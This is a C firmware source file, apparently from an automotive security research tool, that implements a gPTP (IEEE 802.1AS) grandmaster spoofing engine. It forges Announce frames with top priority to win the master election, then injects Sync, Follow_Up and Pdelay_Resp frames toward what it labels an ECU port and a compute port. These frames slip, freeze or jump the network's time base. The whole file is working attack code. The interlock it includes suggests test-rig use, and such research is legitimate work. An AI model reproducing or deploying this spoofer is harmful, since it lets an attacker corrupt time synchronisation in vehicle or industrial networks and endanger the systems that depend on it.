/*
 * gptp_driver.c — IEEE 802.1AS (gPTP) grandmaster spoofing engine
 * Author: jayis1
 * License: GPL-2.0
 * Date:   2026-07-22
 *
 * Implements a minimal IEEE 802.1AS / PTPv2 stack that can:
 *   - Passively observe the current grandmaster and the domain time.
 *   - Spoof a grandmaster with priority1=0 to win the BMC election.
 *   - Slip the time base at a configurable rate (parts per billion).
 *   - Freeze the time base (hold it constant).
 *   - Jump the time base by a delta.
 *
 * The forged grandmaster advertises:
 *   priority1     = 0x00  (highest)
 *   priority2     = 0x00
 *   clockClass    = 0x06  (primary reference, application-specific)
 *   clockAccuracy = 0x20  (<= 1 us)
 *   clockIdentity = 00:00:00:FF:FE:00:00:01
 *
 * gPTP messages are multicast Ethernet frames to 01-80-C2-00-00-0E with
 * EtherType 0x88F7. Frames are injected via the bridge engine.
 */

#include "gptp_driver.h"
#include "bridge_driver.h"
#include "../board.h"
#include "../registers.h"
#include <string.h>

static gptp_state_t g_state;

/* Forged grandmaster identity */
static const uint8_t forged_identity[8] = {
    0x00, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x00, 0x01
};

/* Source MAC for our gPTP frames */
static const uint8_t gptp_src_mac[6] = {
    0x02, 0x00, 0x00, 0xFF, 0xFE, 0x01
};

/* ------------------------------------------------------------------ */
/* PTP header layout (34 bytes)                                         */
/* ------------------------------------------------------------------ */
#pragma pack(push, 1)
typedef struct {
    uint8_t  transport_specific:4;   /* 1 for 802.1AS */
    uint8_t  message_type:4;
    uint8_t  reserved0;
    uint16_t message_length;          /* total PTP message length */
    uint8_t  domain_number;
    uint8_t  reserved1;
    uint16_t flag_field;
    int64_t  correction_field;        /* scaledNs */
    uint32_t reserved2;
    uint8_t  clock_identity[8];
    uint16_t source_port_id;
    uint16_t sequence_id;
    uint8_t  control_field;
    uint8_t  log_message_interval;
} ptp_header_t;

typedef struct {
    uint8_t  clock_identity[8];
    uint16_t source_port_id;
    uint16_t sequence_id;
    uint8_t  control_field;
    uint8_t  log_message_interval;
    /* Announce-specific body follows... */
} ptp_announce_tail_t;

#pragma pack(pop)

/* ------------------------------------------------------------------ */
/* Time                                                                 */
/* ------------------------------------------------------------------ */
static uint64_t now_ns(void)
{
    static uint32_t last_cnt = 0;
    static uint32_t rolls = 0;
    uint32_t cnt = TIM2->CNT;
    if (cnt < last_cnt) rolls++;
    last_cnt = cnt;
    return ((uint64_t)rolls << 32) | cnt;
}

/* Our "advertised" time = real time + accumulated slip offset */
static uint64_t gptp_time_ns(void)
{
    uint64_t t = now_ns();
    /* Apply slip: slip_ppb is in 1e-9; over 1 s of real time, add
     * slip_ppb nanoseconds. Over a delta of dt real nanoseconds,
     * add dt * slip_ppb / 1e9 nanoseconds.
     */
    if (g_state.mode == GPTP_SLIP) {
        static uint64_t last_real = 0;
        if (last_real == 0) last_real = t;
        uint64_t dt = t - last_real;
        g_state.time_offset_ns += (int64_t)((int64_t)dt * g_state.slip_ppb / 1000000000LL);
        last_real = t;
    } else if (g_state.mode == GPTP_FREEZE) {
        /* return a fixed time captured when freeze started */
        static uint64_t frozen = 0;
        if (frozen == 0) frozen = t + g_state.time_offset_ns;
        return frozen;
    }
    return t + g_state.time_offset_ns;
}

/* ------------------------------------------------------------------ */
/* Frame construction                                                   */
/* ------------------------------------------------------------------ */
static uint16_t build_ptp_header(uint8_t *buf, uint8_t msg_type,
                                 uint16_t body_len, uint16_t seq,
                                 uint8_t log_interval)
{
    /* Ethernet header */
    buf[0] = PTP_MAC0; buf[1] = PTP_MAC1; buf[2] = PTP_MAC2;
    buf[3] = PTP_MAC3; buf[4] = PTP_MAC4; buf[5] = PTP_MAC5;
    memcpy(buf + 6, gptp_src_mac, 6);
    buf[12] = 0x88; buf[13] = 0xF7;   /* EtherType 0x88F7 gPTP */

    ptp_header_t *h = (ptp_header_t *)(buf + 14);
    memset(h, 0, sizeof(*h));
    h->transport_specific = 0x1;          /* 802.1AS */
    h->message_type       = msg_type & 0xF;
    h->message_length     = sizeof(ptp_header_t) + body_len;
    h->domain_number      = g_state.domain_number;
    h->flag_field         = 0x0000;
    h->correction_field   = 0;
    memcpy(h->clock_identity, forged_identity, 8);
    h->source_port_id     = 0x0001;
    h->sequence_id        = seq;
    h->control_field      = (msg_type == PTP_MSG_SYNC) ? 0x00 :
                            (msg_type == PTP_MSG_DELAY_REQ) ? 0x01 :
                            (msg_type == PTP_MSG_FOLLOW_UP) ? 0x02 :
                            (msg_type == PTP_MSG_DELAY_RESP) ? 0x03 :
                            (msg_type == PTP_MSG_PDELAY_REQ) ? 0x04 :
                            (msg_type == PTP_MSG_PDELAY_RESP) ? 0x05 : 0x00;
    h->log_message_interval = log_interval;
    return 14 + sizeof(ptp_header_t) + body_len;
}

/* ------------------------------------------------------------------ */
/* Frame senders                                                        */
/* ------------------------------------------------------------------ */
static void send_sync(void)
{
    uint8_t buf[64];
    uint16_t len = build_ptp_header(buf, PTP_MSG_SYNC, 0,
                                    g_state.sequence_id++, 0);
    /* The actual transmit time is captured by the PHY and reported in
     * the Follow_Up; here we just send the Sync with a zero origin
     * timestamp (Two-Step mode).
     */
    bridge_inject(buf, len, 0);   /* inject on port A toward ECU */
    bridge_inject(buf, len, 1);   /* inject on port B toward compute */
    g_state.last_sync_tx_ns = now_ns();
}

static void send_follow_up(uint64_t sync_tx_time)
{
    uint8_t buf[80];
    /* Follow_Up body = 10 bytes (flags) + 8-byte origin timestamp + 0 */
    uint16_t len = build_ptp_header(buf, PTP_MSG_FOLLOW_UP, 10 + 8,
                                   g_state.sequence_id - 1, 0);
    /* Origin timestamp = sync_tx_time (our forged time) */
    uint64_t forged = gptp_time_ns();
    memcpy(buf + 14 + sizeof(ptp_header_t), &forged, 8);
    bridge_inject(buf, len, 0);
    bridge_inject(buf, len, 1);
}

static void send_announce(void)
{
    uint8_t buf[96];
    /* Announce body:
     *   8  currentUtcOffset
     *   1  reserved
     *   1  grandmasterPriority1
     *   1  grandmasterClockClass
     *   1  grandmasterClockAccuracy
     *   2  grandmasterClockVariance
     *   1  grandmasterPriority2
     *   8  grandmasterIdentity
     *   2  stepsRemoved
     *   1  timeSource
     * = 28 bytes
     */
    uint16_t len = build_ptp_header(buf, PTP_MSG_ANNOUNCE, 28,
                                    g_state.sequence_id++, 0);
    uint8_t *body = buf + 14 + sizeof(ptp_header_t);
    body[0] = 0x00; body[1] = 0x00;   /* currentUtcOffset = 0 */
    body[2] = 0xFF;                   /* reserved */
    body[3] = 0x00;                   /* priority1 = 0 */
    body[4] = 0x06;                   /* clockClass = 6 */
    body[5] = 0x20;                   /* clockAccuracy = 0x20 */
    body[6] = 0x00; body[7] = 0x00;   /* clockVariance = 0 */
    body[8] = 0x00;                   /* priority2 = 0 */
    memcpy(body + 9, forged_identity, 8); /* grandmasterIdentity */
    body[17] = 0x00; body[18] = 0x00; /* stepsRemoved = 0 (we are the master) */
    body[19] = 0x20;                   /* timeSource = 0x20 (application-specific) */
    bridge_inject(buf, len, 0);
    bridge_inject(buf, len, 1);
    g_state.last_announce_tx_ns = now_ns();
}

static void send_pdelay_resp(const uint8_t *req_frame, uint16_t req_len,
                             uint64_t req_rx_time)
{
    uint8_t buf[80];
    /* Pdelay_Resp body: 8-byte request receipt timestamp + 8 bytes port identity */
    uint16_t len = build_ptp_header(buf, PTP_MSG_PDELAY_RESP, 16,
                                    g_state.sequence_id++, 0);
    uint64_t resp = gptp_time_ns();
    memcpy(buf + 14 + sizeof(ptp_header_t), &resp, 8);
    /* Copy requesting port identity from the request */
    if (req_len >= 14 + sizeof(ptp_header_t) + 10) {
        memcpy(buf + 14 + sizeof(ptp_header_t) + 8,
               req_frame + 14 + sizeof(ptp_header_t), 10);
    }
    bridge_inject(buf, len, 0);
    bridge_inject(buf, len, 1);
}

/* ------------------------------------------------------------------ */
/* Frame observer                                                       */
/* ------------------------------------------------------------------ */
void gptp_on_frame(const uint8_t *frame, uint16_t len)
{
    if (len < 14 + sizeof(ptp_header_t)) return;
    if (frame[12] != 0x88 || frame[13] != 0xF7) return;

    const ptp_header_t *h = (const ptp_header_t *)(frame + 14);
    /* Record any observed Announce to learn the existing master */
    if ((h->message_type & 0xF) == PTP_MSG_ANNOUNCE && len >= 14 + sizeof(ptp_header_t) + 20) {
        const uint8_t *body = frame + 14 + sizeof(ptp_header_t);
        g_state.observed_master.priority1    = body[3];
        g_state.observed_master.clock_class  = body[4];
        g_state.observed_master.clock_accuracy = body[5];
        g_state.observed_master.steps_removed = body[17] | (body[18] << 8);
        memcpy(g_state.observed_master.clock_identity, body + 9, 8);
        g_state.observed_master.is_local_master =
            memcmp(g_state.observed_master.clock_identity, forged_identity, 8) == 0;
    }
    /* Respond to Pdelay_Req to appear as a peer on the time domain */
    if ((h->message_type & 0xF) == PTP_MSG_PDELAY_REQ && g_state.mode != GPTP_PASSIVE) {
        send_pdelay_resp(frame, len, now_ns());
    }
}

/* ------------------------------------------------------------------ */
/* Initialization                                                       */
/* ------------------------------------------------------------------ */
void gptp_init(void)
{
    memset(&g_state, 0, sizeof(g_state));
    g_state.mode = GPTP_PASSIVE;
    g_state.domain_number = 0;
    g_state.sequence_id = 0;
    g_state.slip_ppb = 0;
    g_state.time_offset_ns = 0;
}

void gptp_set_mode(gptp_mode_t m)
{
    if (m != GPTP_PASSIVE && !armed()) return;   /* hardware interlock */
    g_state.mode = m;
    if (m == GPTP_FREEZE) {
        /* capture current time as frozen */
        g_state.time_offset_ns = 0;  /* gptp_time_ns will capture it */
    }
}

void gptp_set_slip(int32_t ppb)
{
    g_state.slip_ppb = ppb;
    if (ppb != 0) g_state.mode = GPTP_SLIP;
}

void gptp_jump(int64_t delta_ns)
{
    if (!armed()) return;
    g_state.time_offset_ns += delta_ns;
    g_state.mode = GPTP_JUMP;
}

gptp_state_t *gptp_get_state(void)
{
    return &g_state;
}

/* ------------------------------------------------------------------ */
/* Periodic poll — Sync 125 ms, Announce 1 s                            */
/* ------------------------------------------------------------------ */
void gptp_poll(void)
{
    if (g_state.mode == GPTP_PASSIVE) return;
    if (!armed()) {
        g_state.mode = GPTP_PASSIVE;
        return;
    }

    uint64_t t = now_ns();
    /* Sync every 125 ms */
    if (t - g_state.last_sync_tx_ns > 125000000ULL) {
        uint64_t sync_tx_time = t;
        send_sync();
        send_follow_up(sync_tx_time);
    }
    /* Announce every 1 s */
    if (t - g_state.last_announce_tx_ns > 1000000000ULL) {
        send_announce();
    }
}